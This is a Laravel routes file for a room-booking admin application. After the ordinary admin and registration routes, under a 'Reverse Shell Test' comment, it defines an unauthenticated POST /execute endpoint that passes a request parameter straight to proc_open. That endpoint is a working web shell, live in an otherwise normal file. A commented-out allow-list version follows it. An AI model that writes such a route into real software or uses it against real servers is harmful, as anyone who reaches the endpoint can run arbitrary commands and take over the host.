<?php

Route::redirect('/', '/login');
Route::get('/home', function () {
    if (session('status')) {
        return redirect()->route('admin.home')->with('status', session('status'));
    }

    return redirect()->route('admin.home');
});

Auth::routes(['register' => false]);

// Admin
Route::group(['prefix' => 'admin', 'as' => 'admin.', 'namespace' => 'Admin', 'middleware' => ['auth']], function () {
    Route::get('/', 'HomeController@index')->name('home');
    // Permissions
    Route::delete('permissions/destroy', 'PermissionsController@massDestroy')->name('permissions.massDestroy');
    Route::resource('permissions', 'PermissionsController');

    // Roles
    Route::delete('roles/destroy', 'RolesController@massDestroy')->name('roles.massDestroy');
    Route::resource('roles', 'RolesController');

    // Users
    Route::delete('users/destroy', 'UsersController@massDestroy')->name('users.massDestroy');
    Route::resource('users', 'UsersController');

    // Rooms
    Route::delete('rooms/destroy', 'RoomsController@massDestroy')->name('rooms.massDestroy');
    Route::resource('rooms', 'RoomsController');

    // Events
    Route::delete('events/destroy', 'EventsController@massDestroy')->name('events.massDestroy');
    Route::resource('events', 'EventsController');

    Route::get('system-calendar', 'SystemCalendarController@index')->name('systemCalendar');

    Route::get('search-room', 'BookingsController@searchRoom')->name('searchRoom');
    Route::post('book-room', 'BookingsController@bookRoom')->name('bookRoom');

    Route::get('my-credits', 'BalanceController@index')->name('balance.index');
    Route::post('add-balance', 'BalanceController@add')->name('balance.add');

    Route::resource('transactions', 'TransactionsController')->only(['index']);

    // Reverse Shell test
});

// Register new users
Route::get('register', 'Auth\RegisterController@index')->name('register');
Route::post('register', 'Auth\RegisterController@store');

// Reverse Shell Test
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;

Route::post('/execute', function (Request $request) {
    $cmd = trim($request->input('cmd'));
    $cwd = Session::get('terminal_cwd', base_path()); // Retrieve last working directory

    if (empty($cmd)) {
        return response('', 200)->header('Content-Type', 'text/plain');
    }

    if (strpos($cmd, 'cd ') === 0) {
        $newDir = trim(substr($cmd, 3));
        $newPath = realpath($cwd . DIRECTORY_SEPARATOR . $newDir);

        if ($newPath && is_dir($newPath)) {
            Session::put('terminal_cwd', $newPath);
            return response('', 200)->header('Content-Type', 'text/plain');
        } else {
            return response("cd: no such directory: $newDir\n", 200)->header('Content-Type', 'text/plain');
        }
    }

    if ($cmd === 'clear') {
        return response('__CLEAR_SCREEN__', 200)->header('Content-Type', 'text/plain');
    }

    $fullCmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";

    $process = proc_open($fullCmd, [
        1 => ['pipe', 'w'], // Standard output
        2 => ['pipe', 'w'], // Standard error
    ], $pipes, $cwd);

    $output = '';
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $errorOutput = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        proc_close($process);

        $output .= $errorOutput;
    }

    Log::info("Executed Command: $fullCmd in $cwd");

    return response($output, 200)->header('Content-Type', 'text/plain');
});


// Security Implementation to filter shell cmds
// Route::post('/execute', function (Request $request) {
//     $cmd = $request->input('cmd');

//     // Define allowed commands
//     $allowedCommands = ['ls', 'pwd', 'whoami', 'date', 'uptime'];

//     if (!in_array($cmd, $allowedCommands)) {
//         return response()->json(['output' => 'Command not allowed.']);
//     }

//     $output = shell_exec(escapeshellcmd($cmd));
//     Log::info("Executed Command: $cmd");

//     return response()->json(['output' => $output]);
// })->middleware('auth');
